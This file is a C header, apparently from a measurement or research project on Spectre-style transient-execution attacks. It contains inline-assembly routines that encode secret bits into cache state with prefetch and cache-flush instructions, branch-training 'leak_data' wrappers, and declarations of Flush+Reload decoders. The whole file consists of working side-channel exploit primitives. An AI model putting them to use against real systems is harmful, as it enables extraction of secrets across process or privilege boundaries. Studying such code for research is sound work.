#ifndef CBSC_MEASUREMENT_SPECTRE_H
#define CBSC_MEASUREMENT_SPECTRE_H

#include <stdint.h>
#include <stdio.h>

#include "../include/constants.h"
#include "../include/instructions.h"
#include "../include/transfer.h"

static inline __always_inline void asm_encode_load_bitwise(
    uint64_t data, uint8_t *channel,
    uint8_t bits_count, uint64_t stride)
{
    __asm__ volatile("xor %%rax, %%rax\n"

                     "movb $0x0, %%bl\n"
                     "movq $0x1, %%rcx\n"
                     "movq %[stride], %%rdx\n"
                     "movb %[bitscount], %%sil\n"
                     "enc0:\n"

                     "addb $0x1, %%bl\n"
                     "addq %%rdx,%[channel]\n"
                     "movq %[data], %%rax\n"
                     "andq %%rcx, %%rax\n"
                     "testq %%rax, %%rax\n"
                     "jz nenc0\n"
                     "prefetcht0 (%[channel])\n"

                     "nenc0:\n"
                     "sal $0x1, %%rcx\n"
                     "cmpb %%sil, %%bl\n"
                     "jne enc0\n"
                     :
                     : [data] "r"(data), [channel] "r"(channel), [stride] "r"(stride), [bitscount] "r"(bits_count)
                     : "rax", "rbx", "rcx", "rdx", "rsi", "cc");
}

static inline __always_inline void asm_encode_load_dynamic(
    uint64_t data, uint8_t *channel,
    uint8_t n_b, uint8_t n_a, uint64_t bitmask, uint64_t stride)
{
    __asm__ volatile("xor %%rax, %%rax\n"

                     "movb $0x0, %%bl\n"
                     "movq %[stride], %%rdx\n"
                     "movq %[channel], %%r8\n"
                     "movq $0x1, %%rdi\n"
                     "movb %[n_a], %%cl\n"
                     "shl %%cl, %%dil\n"
                     "subq $0x1, %%rdi\n"
                     "imulq %%rdx, %%rdi\n"
                     "movb %[n_b], %%sil\n"
                     //"imulq %%rdi, %%rsi\n"
                     "enc69:\n"

                     "addb $0x1, %%bl\n"
                     //"addq %%rdx, %[channel]\n"
                     "movq %[data], %%rax\n"
                     "andq %[b_mask], %%rax\n"
                     "testq %%rax, %%rax\n"
                     "jz nenc69\n"
                     "subq $0x1, %%rax\n"
                     "imulq %%rdx, %%rax\n"
                     "addq %%rax, %[channel]\n"
                     "prefetcht0 (%[channel])\n"

                     "nenc69:\n"
                     "addq %%rdi, %%r8\n"
                     "movq %%r8, %[channel]\n"
                     "shr %%cl, %[data]\n"
                     "cmpb %%sil, %%bl\n"
                     "jne enc69\n"
                     :
                     : [data] "r"(data), [channel] "r"(channel), [stride] "r"(stride), [n_b] "r"(n_b), [n_a] "r"(n_a), [b_mask] "r"(bitmask)
                     : "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "cc");
}

static inline __always_inline void asm_encode_load_array_index(
    uint64_t data, uint8_t *channel,
    uint8_t bits_count, uint64_t stride)
{
    __asm__ volatile("xor %%rax, %%rax\n"

                     "movb $0x0, %%bl\n"
                     "movq $0x0, %%rcx\n"
                     "movq %[stride], %%rdx\n"
                     "movb %[bitscount], %%sil\n"
                     "bitmask0:\n"
                     "addb $0x1, %%bl\n"
                     "sal $0x1, %%rcx\n"
                     "addq $0x1, %%rcx\n"
                     "cmpb %%sil, %%bl\n"
                     "jne bitmask0\n"

                     "movq %[data], %%rax\n"
                     "andq %%rcx, %%rax\n"
                     "addq $0x01, %%rax\n"
                     "imulq %%rdx, %%rax\n"
                     "prefetcht0 (%[channel], %%rax)\n"
                     :
                     : [data] "r"(data), [channel] "r"(channel), [stride] "r"(stride), [bitscount] "r"(bits_count)
                     : "rax", "rbx", "rcx", "rdx", "rsi", "cc");
}

static inline __always_inline void asm_encode_flush_bitwise(
    uint64_t data, uint8_t *channel,
    uint8_t bits_count, uint64_t stride)
{
    __asm__ volatile("xor %%rax, %%rax\n"

                     "movb $0x0, %%bl\n"
                     "movq $0x1, %%rcx\n"
                     "movq %[stride], %%rdx\n"
                     "movb %[bitscount], %%sil\n"
                     "enc1:\n"

                     "addb $0x1, %%bl\n"
                     "addq %%rdx,%[channel]\n"
                     "movq %[data], %%rax\n"
                     "andq %%rcx, %%rax\n"
                     "testq %%rax, %%rax\n"
                     "jz nenc1\n"
                     "clflush (%[channel])\n"

                     "nenc1:\n"
                     "sal $0x1, %%rcx\n"
                     "cmpb %%sil, %%bl\n"
                     "jne enc1\n"
                     :
                     : [data] "r"(data), [channel] "r"(channel), [stride] "r"(stride), [bitscount] "r"(bits_count)
                     : "rax", "rbx", "rcx", "rdx", "rsi", "cc");
}

// returns true during the training phase, false if encoding can only happen transiently
inline __always_inline bool leak_data(void (*asm_encode)(uint64_t data, uint8_t *channel,
                                                         uint8_t bits_count, uint64_t stride),
                                      uint32_t iteration, uint32_t *train_data,
                                      uint32_t train_data_len, uint64_t secret, uint8_t channel[],
                                      uint8_t bits_count, uint64_t stride)
{
    if (train_data[iteration] < train_data_len)
    {
        asm_encode(secret, channel, bits_count, stride);
        return true;
    }
    return false;
}

// returns true during the training phase, false if encoding can only happen transiently
static bool leak_data_dynamic(void (*asm_encode)(uint64_t data, uint8_t *channel,
                                                 uint8_t n_b, uint8_t n_a, uint64_t bitmask, uint64_t stride),
                              uint32_t iteration, uint32_t *train_data,
                              uint32_t train_data_len, uint64_t secret, uint8_t channel[],
                              uint8_t n_b, uint8_t n_a, uint32_t bitmask, uint64_t stride)
{
    if (train_data[iteration] < train_data_len)
    {
        asm_encode(secret, channel, n_b, n_a, bitmask, stride);
        return true;
    }
    return false;
}

uint64_t decode_flush_reload_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold);

uint64_t decode_flush_reload_array_index(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold);

uint64_t decode_flush_reload_dynamic(uint8_t side_channel[], uint8_t n_b, uint8_t n_a, uint64_t stride, size_t threshold);

uint64_t decode_flush_reload_dynamic_print_props(uint8_t side_channel[], uint8_t n_b, uint8_t n_a, uint64_t stride, size_t threshold);

uint64_t decode_load_flush_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold);

#endif